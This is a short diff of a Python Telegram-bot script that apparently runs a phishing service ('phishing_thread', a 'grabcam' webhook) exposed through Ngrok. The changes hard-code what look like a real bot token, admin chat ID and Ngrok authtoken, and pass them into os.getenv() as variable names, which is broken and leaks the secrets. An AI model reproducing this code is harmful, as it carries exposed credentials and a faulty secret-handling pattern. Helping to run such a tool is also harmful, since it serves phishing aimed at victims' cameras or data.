@@ -10,9 +10,9 @@ from telegram.error import InvalidToken
 import threading
 
 # Configuración del bot
-TOKEN = os.getenv("TOKEN")
-ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+TOKEN = os.getenv("8086330645:AAHgxBvknFaGAuuNhcV2jch-ka0anFbzj3M")
+ADMIN_CHAT_ID = os.getenv("7389519750")
+WEBHOOK_URL = os.getenv("https://grabcam.onrender.com")
 
 # Validar variables de entorno
 if not TOKEN:
@@ -121,7 +121,7 @@ def start_ngrok():
     phishing_thread.start()
     time.sleep(2)
     # Usar Ngrok desde /usr/local/bin/ngrok
-    ngrok_authtoken = os.getenv("NGROK_AUTHTOKEN")
+    ngrok_authtoken = os.getenv("2uiKe4Z9si8iz5isK2ixTU6OIV1_6ZafaubyQxYjEfeFW69b3")
     if ngrok_authtoken:
         print(f"Autenticando Ngrok con token: {ngrok_authtoken[:5]}...")  # Log para depurar
         subprocess.run(["/usr/local/bin/ngrok", "authtoken", ngrok_authtoken], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
